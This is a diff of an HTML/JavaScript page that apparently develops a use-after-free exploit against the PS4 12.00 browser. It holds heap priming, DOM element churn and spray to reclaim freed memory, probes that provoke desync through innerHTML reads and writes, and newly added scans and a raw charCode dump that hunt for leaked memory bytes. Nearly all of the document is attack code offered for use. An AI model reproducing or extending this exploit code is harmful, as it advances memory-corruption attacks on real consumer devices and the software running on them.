@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Leak Stage</title>
+<title>PS4 12.00 - UAF Leak Deep Scan</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF Leak Stage (Desync + Expand + Scan)</h2>
+<h2>UAF Leak Deep Scan (Desync + Raw Scan)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -21,7 +21,7 @@ function log(msg){
 }
 
 // ==========================
-// 💣 HEAP PRIMING (CRÍTICO)
+// 💣 HEAP PRIMING (1 ARRAY)
 // ==========================
 function setupHeap(){
     let t = new Float64Array(8);
@@ -65,12 +65,14 @@ function preciseReclaim(size){
 
     let bucket = [];
 
+    // churn
     for(let i=0;i<1500;i++){
         let el=document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
+    // spray homogêneo
     for(let i=0;i<size;i++){
 
         let el = document.createElement("div");
@@ -95,12 +97,15 @@ function preciseReclaim(size){
 }
 
 // ==========================
-// 🔬 PROBE + LEAK
+// 🔬 PROBE + LEAK PROFUNDO
 // ==========================
 function deepProbe(fsTarget){
 
     log("---- PROBE ----");
 
+    // ==========================
+    // DESYNC
+    // ==========================
     try{
         let html = fsTarget.innerHTML;
         let text = fsTarget.textContent;
@@ -116,6 +121,9 @@ function deepProbe(fsTarget){
         log("[UAF] innerHTML/text crash");
     }
 
+    // ==========================
+    // CHILD INFO
+    // ==========================
     try{
         let child = fsTarget.firstChild;
         log("[CHECK] child = "+child);
@@ -124,7 +132,9 @@ function deepProbe(fsTarget){
         log("[UAF] child crash");
     }
 
-    // 💣 WRITE FORTE
+    // ==========================
+    // WRITE CONTROL
+    // ==========================
     try{
         fsTarget.innerHTML =
             "<div id='x'>" +
@@ -136,46 +146,59 @@ function deepProbe(fsTarget){
         log("[UAF] write crash");
     }
 
-    // 💣 LEAK EXPANDIDO
+    // ==========================
+    // 🔥 LEAK EXPANDIDO
+    // ==========================
     try{
         let html = fsTarget.innerHTML;
-
-        let expanded = html.repeat(20);
+        let expanded = html.repeat(50);
 
         log("[LEAK+] len = " + expanded.length);
-        log("[LEAK+] preview = " + expanded.substring(0,100));
+        log("[LEAK+] preview = " + expanded.substring(0,120));
 
-        let found = false;
+        let weird = [];
 
         for(let i=0;i<expanded.length;i++){
             let c = expanded.charCodeAt(i);
 
-            if(
-                c !== 65 && // A
-                c !== 66 && // B
-                c !== 67 && // C
-                c !== 60 && // <
-                c !== 62 && // >
-                c !== 47 && // /
-                c !== 61 && // =
-                c !== 34 && // "
-                c !== 39 && // '
-                c !== 32    // space
-            ){
-                log("[!!!] BYTE SUSPEITO: " + c);
-                found = true;
-                break;
+            // fora de ASCII visível
+            if(c < 32 || c > 126){
+                weird.push(c);
             }
         }
 
-        if(!found){
-            log("[SCAN] sem bytes estranhos");
+        if(weird.length > 0){
+            log("[!!!] BYTES NÃO ASCII: " + weird.slice(0,20));
+        }else{
+            log("[SCAN] apenas ASCII visível");
         }
 
     }catch(e){
-        log("[LEAK] erro leitura expandida");
+        log("[LEAK] erro scan profundo");
     }
 
+    // ==========================
+    // 🔬 RAW CHARCODE DUMP
+    // ==========================
+    try{
+        let raw = fsTarget.innerHTML;
+        let slice = raw.substring(0, 500);
+
+        let codes = [];
+
+        for(let i=0;i<slice.length;i++){
+            codes.push(slice.charCodeAt(i));
+        }
+
+        log("[RAW] charCodes = " + codes.slice(0,60));
+
+    }catch(e){
+        log("[RAW] erro leitura");
+    }
+
+    // ==========================
+    // OUTROS CHECKS
+    // ==========================
     try{
         let r = fsTarget.getBoundingClientRect();
         log("[CHECK] rect = "+r.height);
